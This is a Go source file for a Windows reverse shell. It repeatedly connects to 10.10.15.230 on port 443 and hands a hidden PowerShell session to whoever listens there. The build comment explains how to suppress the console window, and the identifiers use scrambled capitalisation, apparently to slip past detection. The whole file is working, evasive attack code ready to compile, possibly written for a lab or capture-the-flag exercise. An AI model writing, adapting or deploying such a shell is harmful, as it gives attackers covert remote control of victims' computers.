/*

Compile with:
GOOS=windows GOARCH=<arch> go build -o rev2.exe --ldflags "-H=windowsgui" rev2.go

<arch> = amd64/i686
change the powershell.exe to cmd.exe (or whatever)

*/
package main

import  (
	N3t "net"
	O5E "os/exec"
	sYsC4LL "syscall"
	"time"
)

func main() {

	for true {
		conn, err := N3t.Dial("tcp", "10.10.15.230:443")
		if err != nil {
			//sleep for 5 seconds
			time.Sleep(30 * time.Second)
	 	}

		kOmManDT := O5E.Command("pOwERsHelL.ExE")
		kOmManDT.SysProcAttr = &sYsC4LL.SysProcAttr{HideWindow: true}
	 	kOmManDT.Stdin = conn
	 	kOmManDT.Stdout = conn
	 	kOmManDT.Stderr = conn
	
		kOmManDT.Run()	
	}
}
